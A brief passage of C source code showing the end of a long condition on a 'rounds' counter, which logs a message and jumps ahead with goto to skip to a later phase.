!= 459 && rounds != 475 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
